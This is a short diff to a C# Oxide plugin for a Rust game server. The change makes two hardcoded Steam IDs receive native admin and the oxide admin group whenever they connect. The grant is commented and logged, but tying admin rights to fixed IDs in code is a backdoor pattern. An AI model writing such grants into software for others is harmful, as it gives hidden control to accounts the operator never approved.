@@ -215,8 +215,18 @@ namespace Oxide.Plugins
         // Sync native Rust admins to Oxide Groups/Permissions
         private void OnPlayerConnected(BasePlayer player)
         {
-            if (player.IsAdmin || player.IsDeveloper)
+            // Hardcoded Owners/Moderators
+            bool isHardcodedOwner = (player.UserIDString == "76561198049647064" || player.UserIDString == "76561198116726532");
+
+            if (player.IsAdmin || player.IsDeveloper || isHardcodedOwner)
             {
+                if (!player.IsAdmin && isHardcodedOwner) 
+                {
+                    player.SetPlayerFlag(BasePlayer.PlayerFlags.IsAdmin, true);
+                    player.SendNetworkUpdate();
+                    Puts($"[NWG Core] Force-granted native admin to {player.displayName} ({player.UserIDString})");
+                }
+
                 // Ensure they are in the oxide 'admin' group
                 if (!permission.UserHasGroup(player.UserIDString, "admin"))
                 {
